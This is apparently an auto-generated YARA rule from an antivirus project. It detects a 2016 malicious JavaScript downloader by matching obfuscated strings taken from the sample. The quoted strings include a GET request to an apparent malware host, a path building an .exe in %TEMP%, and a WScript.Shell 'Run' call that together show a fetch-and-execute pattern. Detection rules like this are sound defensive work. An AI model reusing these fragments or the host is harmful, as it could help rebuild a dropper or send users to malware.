rule sig_20160328_b4175c2afe9014cbef56004f46854028 {
  meta:
    description = "datamaliciousorder - file 20160328_b4175c2afe9014cbef56004f46854028.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "69a3f63dfa6b2382a8964ecd75d7a42f2c3f81a0961c8dcda540341f8de03267"

  strings:
    $s1  = "function Pskyyye() {return Mupkkxn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5mfjgQ70qFkmr.exe\";};" fullword ascii
    $s2  = "Pjhnz[Oxgmk](\"GET\", \"http://darjewellery.com/kwo9pa\", false);" fullword ascii
    $s3  = "do {WScript[Rizxxojgpt](Azxwgg() * 11)} while (Pjhnz[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Umxcwi(Mesqfwqy, Sdumjxay){return Mesqfwqy - Sdumjxay;};" fullword ascii
    $s5  = "var Mupkkxn = function Tzefvjlgq() {return WScript[Ywhxe](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Yqsmbwme(Eysvf){Mupkkxn[\"Run\"](Eysvf, Eqfmm, Eqfmm);};" fullword ascii
    $s7  = "function Jpged() {return ((Gdzhwympd == true) && (Gdzhwympd == Yuvltyjfad)) ? 1 : Eqfmm;};" fullword ascii
    $s8  = "function Lhmxx(Qwcomdl) {var Bwrire = (1, 2, 3, 4, 5, Qwcomdl); return Bwrire;};" fullword ascii
    $s9  = " while (Trvhats){" fullword ascii
    $s10 = "function Mqbyot(){return Wwcnvrhqrc;};" fullword ascii
    $s11 = "function Enuumwsgnp()" fullword ascii
    $s12 = "function Azxwgg(){return 22;};" fullword ascii
    $s13 = "return Umxcwi(Illclxvqd, Jvtyoabkwa);" fullword ascii
    $s14 = "Yuvltyjfad = true; " fullword ascii
    $s15 = "var Gdzhwympd = false;" fullword ascii
    $s16 = "Gdzhwympd = true; " fullword ascii
    $s17 = "var Yuvltyjfad = false;" fullword ascii
    $s18 = "var Fofmis = false;" fullword ascii
    $s19 = "function Phfdnupokd(){return Ywhxe;};" fullword ascii
    $s20 = "var Paaoqkojv = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}